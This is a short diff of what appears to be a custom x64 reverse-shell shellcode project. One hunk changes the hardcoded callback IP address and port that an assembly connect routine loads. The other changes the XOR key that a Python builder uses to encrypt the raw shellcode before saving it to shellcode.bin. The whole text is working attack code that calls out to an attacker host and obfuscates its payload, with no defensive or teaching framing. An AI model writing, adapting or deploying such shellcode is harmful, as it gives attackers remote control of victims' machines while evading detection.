@@ -152,7 +152,9 @@ call_connect:
     mov r8, 16                          # R8 = Parameter namelen = 16
     
     # 0x4201A8C0FB200002
-    mov r9, 0x4201A8C0FB200002          # R9 = IPv4 + Port (188.190.4.219:8443)
+    # 0x010a0a0abb010002 -> 10.10.10.10:443
+
+    mov r9, 0x9d2da8c0bb010002          # R9 = IPv4 + Port
     lea rdx, [rsp + 800]                # RDX = Parameter name
     mov [rdx], r9                       
     xor r9, r9
@@ -237,7 +239,7 @@ with open("shellcode.bin", "wb") as f:
 print("[+] Raw shellcode saved to shellcode.bin")
 
 # Encrypt with XOR
-key = b"Gdb1p_dnbp1DD123@#"
+key = b"Gdb1p_dnbp1DD@#"
 enc_sh = bytearray()
 shellcode_bytes = bytearray(sh)
 
